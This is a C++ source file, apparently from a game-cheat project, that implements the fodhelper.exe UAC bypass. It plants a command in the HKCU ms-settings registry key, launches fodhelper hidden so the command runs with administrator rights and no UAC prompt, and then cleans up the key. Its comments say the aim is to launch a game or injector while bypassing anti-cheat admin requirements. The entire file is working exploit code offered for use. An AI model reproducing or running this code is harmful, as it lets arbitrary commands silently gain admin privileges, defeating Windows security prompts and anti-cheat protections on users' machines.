// COPYRIGHT VV.EXE Development Team 2026. All rights reserved.
// UAC Bypass using fodhelper.exe / computerdefaults.exe technique
// This allows launching the game or injector with High Integrity Level (Admin)
// WITHOUT triggering the UAC prompt, bypassing local anti-cheat admin requirements.

#include <windows.h>
#include <iostream>
#include <string>

bool SetRegistryValue(HKEY hKey, const std::wstring& subKey, const std::wstring& valueName, const std::wstring& data) {
    HKEY hSubKey;
    if (RegCreateKeyExW(hKey, subKey.c_str(), 0, NULL, 0, KEY_WRITE, NULL, &hSubKey, NULL) != ERROR_SUCCESS) {
        return false;
    }
    LSTATUS status = RegSetValueExW(hSubKey, valueName.c_str(), 0, REG_SZ, (const BYTE*)data.c_str(), (data.length() + 1) * sizeof(wchar_t));
    RegCloseKey(hSubKey);
    return status == ERROR_SUCCESS;
}

bool DeleteRegistryKey(HKEY hKey, const std::wstring& subKey) {
    return RegDeleteTreeW(hKey, subKey.c_str()) == ERROR_SUCCESS;
}

int wmain(int argc, wchar_t* argv[]) {
    if (argc < 2) {
        std::wcout << L"Usage: uac_bypass.exe <command_to_execute>" << std::endl;
        std::wcout << L"Example: uac_bypass.exe \"C:\\Program Files (x86)\\Steam\\steamapps\\common\\STALZONE\\game.exe\"" << std::endl;
        return 1;
    }

    std::wstring command = argv[1];
    std::wstring regPath = L"Software\\Classes\\ms-settings\\Shell\\Open\\command";
    std::wstring fodhelperPath = L"C:\\Windows\\System32\\fodhelper.exe";

    std::wcout << L"[*] Setting up registry keys for UAC bypass..." << std::endl;
    
    // Set the command to execute
    if (!SetRegistryValue(HKEY_CURRENT_USER, regPath, L"", command)) {
        std::wcerr << L"[-] Failed to set command registry value." << std::endl;
        return 1;
    }

    // Set DelegateExecute to empty (required for the bypass)
    if (!SetRegistryValue(HKEY_CURRENT_USER, regPath, L"DelegateExecute", L"")) {
        std::wcerr << L"[-] Failed to set DelegateExecute registry value." << std::endl;
        return 1;
    }

    std::wcout << L"[*] Launching fodhelper.exe to trigger auto-elevation..." << std::endl;
    
    // Launch fodhelper.exe which has autoElevate: true in its manifest
    // It will read ms-settings\Shell\Open\command and execute our payload with High IL
    SHELLEXECUTEINFOW sei = { sizeof(sei) };
    sei.lpVerb = L"open";
    sei.lpFile = fodhelperPath.c_str();
    sei.nShow = SW_HIDE;
    
    if (!ShellExecuteExW(&sei)) {
        std::wcerr << L"[-] Failed to launch fodhelper.exe." << std::endl;
    } else {
        std::wcout << L"[+] UAC bypass successful! Command executed with Admin privileges." << std::endl;
        Sleep(2000); // Give it time to execute
    }

    std::wcout << L"[*] Cleaning up registry..." << std::endl;
    DeleteRegistryKey(HKEY_CURRENT_USER, L"Software\\Classes\\ms-settings");

    return 0;
}
